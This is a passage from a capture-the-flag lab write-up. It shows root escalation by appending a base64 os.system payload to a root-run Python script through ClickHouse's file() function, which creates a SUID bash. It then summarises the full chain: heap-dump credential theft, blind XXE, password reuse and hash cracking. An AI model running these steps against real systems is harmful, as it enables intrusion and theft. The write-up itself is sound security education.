Crucially, `INSERT INTO FUNCTION file(...)` **appends** to an existing file rather than overwriting it. Since `aidx_quarantine.py` is a plain Python script, appending one extra top-level line of Python causes it to **execute right after `main()` runs** (Python executes module-level statements top-to-bottom, so an appended line after the `if __name__ == "__main__": main()` block runs immediately after the original script's logic completes).

Payload construction:

```bash
CMD='cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
B64=$(echo -n "$CMD" | base64 -w0)
```

Appending the malicious line via ClickHouse's `file()` table function:

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' \
  --data-binary "INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 's String') \
  VALUES ('import os,base64;os.system(base64.b64decode(\"$B64\").decode())')"
```

Verifying the append worked:

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' \
  --data-binary "SELECT s FROM file('aidx_quarantine.py','LineAsString','s String') FORMAT TSVRaw"
```
```python
#!/usr/bin/env python3
import sys

def main():
    raw = sys.stdin.buffer.read()
    text = raw.decode("utf-8", errors="replace")

    root_tag = "UNKNOWN"
    lt = text.find("<")
    while lt != -1:
        if text[lt:lt+4] == "<!--" or text[lt:lt+2] == "<?":
            lt = text.find("<", lt+1)
            continue
        end = lt + 1
        while end < len(text) and text[end] not in " \t\r\n>/":
            end += 1
        cand = text[lt+1:end].strip()
        if cand:
            root_tag = cand.rsplit(":", 1)[-1]
        break

    preview = " ".join(text.split())[:120]
    sys.stdout.write(f"{len(raw)}\t{root_tag}\t{preview}\n")

if __name__ == "__main__":
    main()
import os,base64;os.system(base64.b64decode("<REDACTED_B64_PAYLOAD>").decode())
```

Confirmed: our malicious line is now the last line of the real `aidx_quarantine.py` script, sitting in ClickHouse's user_files sandbox, which **is the exact same path the root-owned `dlq_drainer.py` executes on every DLQ message.**

### 8.7 Triggering Execution

To make the timer's drainer actually invoke the formatter, a message needs to land in the DLQ topic. A trivial malformed/test message was produced directly into the DLQ topic:

```bash
martin_cole@stream:/opt/ops$ echo "<IATA_AIDX_FlightLegNotifRQ>test</IATA_AIDX_FlightLegNotifRQ>" | \
  /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server localhost:9092 --topic aidx.flightleg.dlq.v1
```

Then waited for the `aidx-dlq-drainer.timer` to fire (runs every 2 minutes):

```bash
martin_cole@stream:/opt/ops$ ls -la /tmp/rootbash
```
```
-rwsr-xr-x 1 root root 1446024 Oct 15 06:16 /tmp/rootbash
```

The SUID-root bash binary now exists — the appended payload executed as root.

### 8.8 Root Shell and Flag

```bash
martin_cole@stream:/opt/ops$ /tmp/rootbash -p
rootbash-5.2# cd /root
rootbash-5.2# cat root.txt
```
```
<REDACTED_ROOT_FLAG>
```

**Root flag obtained.**

---

## 9. Step-by-Step Summary

1. **Nmap scan** reveals SSH (22), nginx (80, redirecting to `api.htb-airport.htb`), and a raw Uvicorn service (8081).
2. Add discovered vhost to `/etc/hosts`; **vhost fuzzing** uncovers two more subdomains: `api` and `db`.
3. `db.htb-airport.htb` is a **ClickHouse** HTTP interface (requires credentials — parked for later).
4. **Directory fuzzing** on `api.htb-airport.htb` finds `/health`, `/status`, `/error` — informational only, no vulnerability yet.
5. A **second fuzzing pass** with a different wordlist finds `/actuator` and `/actuator/heapdump` — an exposed **Spring Boot Actuator heap dump** (~58 MB Java HPROF file).
6. Download the heap dump and run **JDumpSpider** against it → recovers a HikariCP/JDBC credential pair for `svc_events`.
7. Use `svc_events` creds to authenticate to the **ClickHouse** HTTP API on `db.htb-airport.htb`.
8. Enumerate databases/tables; confirm `svc_events` is limited to `SELECT, INSERT` on `partner_feed` (least privilege confirmed via `SHOW GRANTS`, and via a denied `SELECT * FROM system.users`).
9. Read `partner_feed.flightleg_raw` and discover it stores **IATA AIDX XML** flight-leg messages; the Kafka-engine table DDLs reveal the **ingest → raw topic → XML→JSON transformer → json topic → ClickHouse table** pipeline.
10. Query the raw ingest service (port 8081, `/`) and learn it explicitly **does not parse XML itself** — parsing happens downstream, which is the actual XXE attack surface.
11. Submit a crafted **blind XXE** payload (`file:///etc/passwd`) to `POST /feeds/aidx`; the ingest API accepts it (202) but gives no direct feedback.
12. **Read back the XXE result** from `partner_feed.flightleg_json` via ClickHouse, confirming arbitrary file read and revealing local users `svc-infra` and `martin_cole`.
13. Pivot the same XXE to read `/etc/systemd/system/kafka.service`, learning Kafka runs as `svc-infra` with its real config at `/opt/kafka_2.13-4.3.1/config/server.properties`.
14. Read `server.properties` via the same XXE technique → recovers a **plaintext SASL/JAAS password** for `svc_infra`.
15. **Password reuse check:** attempt SSH login as `svc-infra` using the Kafka SASL password — succeeds, proving the password was reused as the OS account password. Initial shell obtained.
16. On the box, discover a second SASL config file (`/tmp/kafka_sasl.properties`) granting access to an authenticated Kafka listener (port 9094) not visible on the unauthenticated listener (9092).
17. Enumerate topics on the authenticated listener → find hidden topic `aidx.identity.json.v1`; check offsets to confirm messages exist before consuming.
18. Consume the topic → recover a **bcrypt password hash** for local user `martin_cole`.
19. Crack the bcrypt hash with **John the Ripper** against `rockyou.txt` (cracked almost instantly — weak/dictionary password).
20. `su -` to `martin_cole` using the cracked password → retrieve **user flag**.
21. Find a **Kopia backup repository** in `martin_cole`'s home directory; list and restore a snapshot of ClickHouse server logs.
22. **Grep the restored logs** for `password`/`identified by` → find a failed `ALTER USER default IDENTIFIED BY '...'` query whose **syntax error echoed the new password in plaintext** into the error log. Recovers ClickHouse `default` user's password.
23. Inspect a systemd timer (`aidx-dlq-drainer.timer`) and its script (`dlq_drainer.py`, owned by root) → learn that **every 2 minutes, root executes `/var/lib/clickhouse/user_files/aidx_quarantine.py`** as a subprocess against every message in the DLQ Kafka topic.
24. Authenticate to ClickHouse as `default`; `SHOW GRANTS` confirms broad privileges including `FILE`, enabling use of the `file()` table function to read/write inside ClickHouse's `user_files` sandbox — which is exactly where `aidx_quarantine.py` lives.
25. Exploit the fact that `INSERT INTO FUNCTION file(...)` **appends rather than overwrites**: append a one-line Python payload (base64-encoded `os.system()` call that copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit) to the end of `aidx_quarantine.py`. Verify the append landed correctly by reading the file back.
26. Produce a throwaway message directly into the `aidx.flightleg.dlq.v1` Kafka topic to **trigger** the drainer/formatter pipeline on the next timer run.
27. Wait ~2 minutes for the systemd timer to fire; confirm `/tmp/rootbash` now exists as a SUID-root binary.
28. Run `/tmp/rootbash -p` to get an effective-root shell → retrieve **root flag**.

---

## 10. Key Vulnerabilities / Lessons

| # | Issue | Impact |
|---|-------|--------|
| 1 | Exposed Spring Boot Actuator `/heapdump` endpoint | Leaked live JDBC credentials from process memory |
| 2 | Blind XXE in downstream AIDX XML parser | Arbitrary file read on the host |
| 3 | Password reuse between Kafka SASL credential and OS account | Remote → local foothold |
| 4 | Sensitive data (bcrypt hash) placed on an internal Kafka topic without strong ACL separation | Credential harvesting → lateral movement |
| 5 | Weak/dictionary password protected by bcrypt | Hash cracked almost instantly with rockyou.txt |
| 6 | Secrets echoed into application error logs (`ALTER USER ... IDENTIFIED BY`) | Plaintext DB admin password leaked via log/backups |
| 7 | Root-owned cron/timer job executes an **attacker-writable** script (ClickHouse `user_files` sandbox writable by `default` DB user) | Full privilege escalation to root via `INSERT INTO FUNCTION file()` append-based code injection |

### Tools / References Used
- [JDumpSpider](https://github.com/whwlsfb/JDumpSpider) — heap dump credential extraction
- `ffuf` — vhost & directory fuzzing
- ClickHouse HTTP interface (`/?user=...&password=...`) for SQL execution
- `kafka-topics.sh`, `kafka-get-offsets.sh`, `kafka-console-consumer.sh`, `kafka-console-producer.sh` (bundled with Apache Kafka)
- `john` (John the Ripper) — bcrypt cracking against `rockyou.txt`
- `kopia` — backup snapshot listing/restoration
